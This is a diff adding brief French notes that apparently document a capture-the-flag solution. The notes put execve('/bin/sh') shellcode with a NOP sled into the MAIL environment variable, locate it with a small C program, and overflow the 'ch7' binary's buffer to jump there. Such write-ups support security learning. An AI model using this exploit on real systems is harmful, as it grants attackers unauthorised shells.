@@ -1,0 +1,24 @@
+Besoin d'injecter un shellcode
+On remplace un element non important de l'env 
+export = MAIL=$(ruby -e 'print "\x90"*85+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"')
+Le 85 est un chiffre aleatoire trouve apres plusieurs test
+
+On recupere l'addresse en hexa de MAIL
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+int main(int argc, char **argv) {
+	char *ptr;
+	ptr = getenv(argv[1]);
+	if( ptr == NULL )
+		printf("%s not found\n", argv[1]);
+		else printf("%s found at %08x\n", argv[1], (unsigned int)ptr);
+		return 0;
+}
+
+En executant ce programme
+
+et ensuite ./ch7 $(python -c 'print "A"*512+"\x52\xfe\xff\xbf"')
+
+en remplissant le buffer de A est en passant l'adresse de MAIL derriere
